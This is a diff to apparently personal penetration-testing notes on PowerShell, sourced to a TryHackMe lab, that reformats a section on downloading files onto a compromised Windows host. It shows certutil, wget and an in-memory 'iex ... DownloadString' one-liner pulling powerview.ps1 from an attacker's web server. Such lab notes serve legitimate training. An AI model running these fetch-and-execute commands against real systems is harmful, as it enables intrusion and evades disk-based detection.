@@ -44,24 +44,29 @@
 - `Verb-Noun | Sort-Object`
 - Example: `Get-ChildItem | Sort-Object` sorting the list of directories
 
-Source: [TryHackMe - Throwback](https://tryhackme.com/room/throwback)
+> *Source: [TryHackMe - Throwback](https://tryhackme.com/room/throwback)*
 
 ## Downloading files
 
 - `certutil.exe -urlcache -f http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need name-you-want-to-give-the-file` (works also in cmd)
-  ```
+
+```powershell
   PS C:\Users\users\Desktop> certutil.exe -urlcache -f http://192.168.3.28/powerview.ps1 powerview.ps1
   ****  Online  ****
   CertUtil: -URLCache command completed successfully.
-  ```
+```
+
 - `wget http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need -OutFile name-you-want-to-give-the-file`
-  ```
+
+```powershell
   PS C:\Users\user\Desktop> wget http://192.168.3.28/powerview.ps1 -OutFile powerview.ps1
-  ```
+```
+
 - `iex (New-Object Net.WebClient).DownloadString('http://IP-OF-YOUR-WEBSERVER-WHERE-FILES-ARE-HOSTED/file-you-need')` will load it in memory without writing it in the disk, we will the be able to run powerview command if we use it to load powerview for instance
-  ```
+
+```powershell
   PS C:\Users\s.chisholm.mayorsec\Desktop> iex (New-Object Net.WebClient).DownloadString('http://192.168.3.28/powerview.ps1')
-  ```
+```
 
 ## Offensive Powershell
 
